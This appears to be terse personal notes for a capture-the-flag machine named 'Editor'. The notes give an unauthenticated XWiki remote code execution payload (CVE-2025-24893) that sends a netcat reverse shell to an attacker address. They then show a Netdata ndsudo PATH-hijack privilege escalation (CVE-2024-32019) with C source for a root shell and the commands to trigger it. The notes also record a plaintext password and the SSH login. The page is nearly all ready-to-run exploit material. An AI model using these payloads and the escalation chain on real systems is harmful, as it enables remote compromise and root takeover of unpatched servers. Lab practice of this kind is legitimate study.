---
title: "Editor"
---

# Editor

XWiki Debian 15.10.8 

[GitHub - gunzf0x/CVE-2025-24893: PoC for CVE-2025-24893: XWiki' Remote Code Execution exploit for versions prior to 15.10.11, 16.4.1 and 16.5.0RC1.](https://github.com/gunzf0x/CVE-2025-24893)

[CVE-2025-24893 – Unauthenticated Remote Code Execution in XWiki via SolrSearch Macro](https://www.offsec.com/blog/cve-2025-24893/)

```HTTP
GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22busybox%20nc%2010.10.16.13%204444%20-e%20%2fbin%2fbash%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20 
```

```http
GET /xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println("busybox nc 10.10.16.13 4444 -e /bin/bash".execute().text){{/groovy}}{{/async}} 
```

```
xwiki \ theEd1t0rTeam99
```

```
ssh oliver@10.10.11.80
```

```bash
find / -group netdata 2>/dev/null | grep -v -e '^/run' -e '^/sys' -e '^/proc'
```


```bash
./netdata -v
```

[💀 Exploit for CVE-2024-32019](https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5)

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

[GitHub - dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation: CVE-2024-32019 is a high-severity local privilege escalation vulnerability in Netdata (versions >= 1.44.0-60 &lt; 1.45.3), caused by insecure use of the PATH variable in the ndsudo SUID binary, allowing attackers to execute arbitrary commands as root.](https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

```bash
gcc poc.c -o nvme
```

```bash
chmod +x nvme
```

```bash
export PATH=/tmp:$PATH
```

```bash
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
